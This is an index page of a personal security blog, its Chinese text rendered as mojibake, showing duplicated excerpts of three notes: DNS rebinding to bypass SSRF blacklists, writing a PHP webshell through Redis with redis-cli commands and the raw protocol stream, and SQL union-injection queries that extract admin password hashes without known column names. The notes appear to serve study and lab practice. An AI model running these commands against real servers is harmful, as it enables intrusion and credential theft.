<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Page 9 | ğŸ˜Š#</title>
  <meta name="author" content="JKme">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="ğŸ˜Š#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="ğŸ˜Š#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ğŸ˜Š#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>ğŸ˜Š#<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		wubba lubba dub dub.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/12/06/dns-rebinding.html" >DNS Rebinding</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-12-06  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æœ€åçš„é“¾æ¥æ˜¯å…³äºdns rebindingçš„æ–‡ç« ï¼Œè¿™é‡Œä¸»è¦åšä¸€ä¸ªç¬”è®°ï¼š</p>
<p>å…ˆç›—ç”¨ricterz.meçš„åšå®¢ä¸€ä¸ªå›¾<br><img src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p>
<p>åœ¨ssrfçš„æ—¶å€™ï¼Œå®¢æˆ·ä¿®å¤è¿‡ä¹‹åã€‚å†æ¬¡åˆ¤æ–­urlçš„æ—¶å€™ï¼Œé€»è¾‘å°±æ˜¯ä¸Šå›¾è¿™ä¸ªæ ·å­ã€‚</p>
<ol>
<li>è·å–è¯·æ±‚çš„åœ°å€ï¼Œå¦‚æœæ˜¯åŸŸåï¼Œé€šè¿‡DNSè§£æçš„æ–¹å¼è·å–çœŸå®IPï¼Œå¦‚æœæ˜¯IPåˆ™ç›´æ¥å¯¹æ¯”æ˜¯å¦åœ¨æŒ‡å®šçš„IPæ®µå†…ã€‚</li>
<li>æ¯”å¦‚è·å–äº†test.loli.clubè¯·æ±‚åœ°å€æ˜¯10.0.0.1ï¼Œé»‘åå•æ˜¯10.0.0.0/8ï¼Œåˆ™æ‹’ç»è®¿é—®</li>
</ol>
<p>ä½¿ç”¨DNS Rebindingçš„ä¼šæœ‰è¿™æ ·çš„æ”»å‡»æ•ˆæœ:</p>
<ol>
<li>è·å–test.loli.clubçš„è¯·æ±‚åœ°å€ä¸æ˜¯10.0.0.0/8è¿™ä¸ªé»‘åå•èŒƒå›´é‡Œé¢</li>
<li>æ”¾è¡Œä¹‹åï¼Œç„¶ååç«¯è¯·æ±‚è¿™ä¸ªURLçš„èµ„æºã€‚å¦‚æœTTLè¶³å¤Ÿå°ï¼Œè¿™ä¸ªæ—¶å€™ä¼šåˆå‘ç”Ÿä¸€æ¬¡DNSè§£æã€‚å¦‚æœè¿™ä¸ªURLå¯æ§ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è¿™æ¬¡çš„è§£æIPã€‚</li>
</ol>
<p>DNSè¿”å›çš„æ•°æ®åŒ…å­˜åœ¨ä¸€ä¸ªTTL(Time-to-Live),ä¹Ÿå°±æ˜¯åŸŸåè§£æè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸Šçš„ç¼“å­˜æ—¶é—´ã€‚å¦‚æœä¸¤æ¬¡DNSçš„è¯·æ±‚æ—¶é—´å¤§äºTTLï¼Œå°±ä¼šé‡æ–°è¿›è¡Œä¸€æ¬¡DNSè§£æè¯·æ±‚ã€‚</p>
<p>æ‰€ä»¥ï¼Œç¬¬ä¸€æ¬¡å‘ç”ŸDNSè§£æçš„æ—¶å€™ï¼Œè¿”å›ä¸€ä¸ªä¸åœ¨é»‘åå•çš„IPåœ°å€ï¼Œç¬¬äºŒæ¬¡æœåŠ¡ç«¯URLè¯·æ±‚çš„æ—¶å€™ï¼Œè®©æœåŠ¡å™¨è¿”å›ä¸€æ¬¡DNSè§£æï¼Œè§£æåˆ°é»‘åå•åœ°å€ï¼Œä»è€Œç»•è¿‡ã€‚</p>
<p>æ ¹æ®goychouå¤§ç¥çš„è„šæœ¬ï¼Œæµ‹è¯•ä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ul>
<li>æ·»åŠ ä¸€ä¸ªAè®°å½•ï¼ŒåŸŸåæ˜¯ns.xyz.pwï¼ŒæŒ‡å‘æœåŠ¡å™¨A</li>
<li>å†æ·»åŠ ä¸€ä¸ªnsè®°å½•ï¼ŒåŸŸåæ˜¯rebind.xyz.pwï¼ŒæŒ‡å‘ns.xyz.pw</li>
</ul>
	

	</div>
  <a type="button" href="/2017/12/06/dns-rebinding.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æœ€åçš„é“¾æ¥æ˜¯å…³äºdns rebindingçš„æ–‡ç« ï¼Œè¿™é‡Œä¸»è¦åšä¸€ä¸ªç¬”è®°ï¼š</p>
<p>å…ˆç›—ç”¨ricterz.meçš„åšå®¢ä¸€ä¸ªå›¾<br><img src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p>
<p>åœ¨ssrfçš„æ—¶å€™ï¼Œå®¢æˆ·ä¿®å¤è¿‡ä¹‹åã€‚å†æ¬¡åˆ¤æ–­urlçš„æ—¶å€™ï¼Œé€»è¾‘å°±æ˜¯ä¸Šå›¾è¿™ä¸ªæ ·å­ã€‚</p>
<ol>
<li>è·å–è¯·æ±‚çš„åœ°å€ï¼Œå¦‚æœæ˜¯åŸŸåï¼Œé€šè¿‡DNSè§£æçš„æ–¹å¼è·å–çœŸå®IPï¼Œå¦‚æœæ˜¯IPåˆ™ç›´æ¥å¯¹æ¯”æ˜¯å¦åœ¨æŒ‡å®šçš„IPæ®µå†…ã€‚</li>
<li>æ¯”å¦‚è·å–äº†test.loli.clubè¯·æ±‚åœ°å€æ˜¯10.0.0.1ï¼Œé»‘åå•æ˜¯10.0.0.0/8ï¼Œåˆ™æ‹’ç»è®¿é—®</li>
</ol>
<p>ä½¿ç”¨DNS Rebindingçš„ä¼šæœ‰è¿™æ ·çš„æ”»å‡»æ•ˆæœ:</p>
<ol>
<li>è·å–test.loli.clubçš„è¯·æ±‚åœ°å€ä¸æ˜¯10.0.0.0/8è¿™ä¸ªé»‘åå•èŒƒå›´é‡Œé¢</li>
<li>æ”¾è¡Œä¹‹åï¼Œç„¶ååç«¯è¯·æ±‚è¿™ä¸ªURLçš„èµ„æºã€‚å¦‚æœTTLè¶³å¤Ÿå°ï¼Œè¿™ä¸ªæ—¶å€™ä¼šåˆå‘ç”Ÿä¸€æ¬¡DNSè§£æã€‚å¦‚æœè¿™ä¸ªURLå¯æ§ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è¿™æ¬¡çš„è§£æIPã€‚</li>
</ol>
<p>DNSè¿”å›çš„æ•°æ®åŒ…å­˜åœ¨ä¸€ä¸ªTTL(Time-to-Live),ä¹Ÿå°±æ˜¯åŸŸåè§£æè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸Šçš„ç¼“å­˜æ—¶é—´ã€‚å¦‚æœä¸¤æ¬¡DNSçš„è¯·æ±‚æ—¶é—´å¤§äºTTLï¼Œå°±ä¼šé‡æ–°è¿›è¡Œä¸€æ¬¡DNSè§£æè¯·æ±‚ã€‚</p>
<p>æ‰€ä»¥ï¼Œç¬¬ä¸€æ¬¡å‘ç”ŸDNSè§£æçš„æ—¶å€™ï¼Œè¿”å›ä¸€ä¸ªä¸åœ¨é»‘åå•çš„IPåœ°å€ï¼Œç¬¬äºŒæ¬¡æœåŠ¡ç«¯URLè¯·æ±‚çš„æ—¶å€™ï¼Œè®©æœåŠ¡å™¨è¿”å›ä¸€æ¬¡DNSè§£æï¼Œè§£æåˆ°é»‘åå•åœ°å€ï¼Œä»è€Œç»•è¿‡ã€‚</p>
<p>æ ¹æ®goychouå¤§ç¥çš„è„šæœ¬ï¼Œæµ‹è¯•ä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ul>
<li>æ·»åŠ ä¸€ä¸ªAè®°å½•ï¼ŒåŸŸåæ˜¯ns.xyz.pwï¼ŒæŒ‡å‘æœåŠ¡å™¨A</li>
<li>å†æ·»åŠ ä¸€ä¸ªnsè®°å½•ï¼ŒåŸŸåæ˜¯rebind.xyz.pwï¼ŒæŒ‡å‘ns.xyz.pw</li>
</ul>
	
	</div>
  <a type="button" href="/2017/12/06/dns-rebinding.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/12/05/redis-crontab.html" >redis hacker</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-12-05  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>Orangeåœ¨BHå¤§ä¼šçš„paperä¸Šé¢è¿™ä¹ˆè¯´çš„:</p>
<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
  HTTP based protocol:
  	Elastic, CouchDB, Mongodb, Docker
  
  Text-based protocol:
    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Phåœ¨ä»–<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>é‡Œé¢ä¹Ÿæåˆ°è¿‡ï¼Œredisçš„åè®®æ˜¯ç®€å•çš„åè®®æµï¼Œå…³äºè¿™ä¸€ç‚¹å¯ä»¥æŸ¥çœ‹redisçš„å®˜æ–¹è§£é‡Š: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>åœ¨è¿™ç¯‡æ–‡ç« é‡Œé¢æåˆ°ä½¿ç”¨gopheræ¥æ”»å‡»redisï¼Œä½¿ç”¨çš„æ­¥éª¤æ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li>redis-serverå¯åŠ¨çš„æ—¶å€™ç›‘å¬6378ç«¯å£ <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
<li>è¿è¡Œ<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
<li>ç„¶åå†æ­£å¸¸ä½¿ç”¨redisæ¥æ”»å‡»</li>
</ul>
<h2 id="å†™shell"><a href="#å†™shell" class="headerlink" title="å†™shell"></a>å†™shell</h2><p>ç›¸å½“äºæŠŠ6379çš„ç«¯å£æµé‡è½¬å‘åˆ°6378ï¼Œè€Œredis-serverç›‘å¬çš„æ˜¯6378ç«¯å£ï¼Œä½¿ç”¨redis-serveræ¥å†™shellæ˜¯è¿™æ ·çš„æ­¥éª¤:</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
redis-cli -h 127.0.0.1 config set dbfilename shell.php
redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç„¶åå¾—åˆ°çš„æ•°æ®æµå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$8\r
&#x2F;var&#x2F;www\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$3\r
web\r
$18\r
&lt;?php phpinfo();?&gt;\r
*1\r
$4\r
save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>Orangeåœ¨BHå¤§ä¼šçš„paperä¸Šé¢è¿™ä¹ˆè¯´çš„:</p>
<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
  HTTP based protocol:
  	Elastic, CouchDB, Mongodb, Docker
  
  Text-based protocol:
    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Phåœ¨ä»–<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>é‡Œé¢ä¹Ÿæåˆ°è¿‡ï¼Œredisçš„åè®®æ˜¯ç®€å•çš„åè®®æµï¼Œå…³äºè¿™ä¸€ç‚¹å¯ä»¥æŸ¥çœ‹redisçš„å®˜æ–¹è§£é‡Š: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>åœ¨è¿™ç¯‡æ–‡ç« é‡Œé¢æåˆ°ä½¿ç”¨gopheræ¥æ”»å‡»redisï¼Œä½¿ç”¨çš„æ­¥éª¤æ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li>redis-serverå¯åŠ¨çš„æ—¶å€™ç›‘å¬6378ç«¯å£ <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
<li>è¿è¡Œ<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
<li>ç„¶åå†æ­£å¸¸ä½¿ç”¨redisæ¥æ”»å‡»</li>
</ul>
<h2 id="å†™shell"><a href="#å†™shell" class="headerlink" title="å†™shell"></a>å†™shell</h2><p>ç›¸å½“äºæŠŠ6379çš„ç«¯å£æµé‡è½¬å‘åˆ°6378ï¼Œè€Œredis-serverç›‘å¬çš„æ˜¯6378ç«¯å£ï¼Œä½¿ç”¨redis-serveræ¥å†™shellæ˜¯è¿™æ ·çš„æ­¥éª¤:</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
redis-cli -h 127.0.0.1 config set dbfilename shell.php
redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç„¶åå¾—åˆ°çš„æ•°æ®æµå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$8\r
&#x2F;var&#x2F;www\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$3\r
web\r
$18\r
&lt;?php phpinfo();?&gt;\r
*1\r
$4\r
save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/11/28/sql-bypass-unknown.html" >SQLæ³¨å…¥ç»•è¿‡æœªçŸ¥å­—æ®µåçš„æŠ€å·§</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-11-28  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQLæ³¨å…¥ä¹‹è¿‡æ»¤åˆ—ågetæ•°æ®/</a> </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> admin  <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> admin2 <span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span> admin3 <span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token operator">|</span> <span class="token number">3</span>     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token operator">|</span> id    <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




	

	</div>
  <a type="button" href="/2017/11/28/sql-bypass-unknown.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQLæ³¨å…¥ä¹‹è¿‡æ»¤åˆ—ågetæ•°æ®/</a> </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
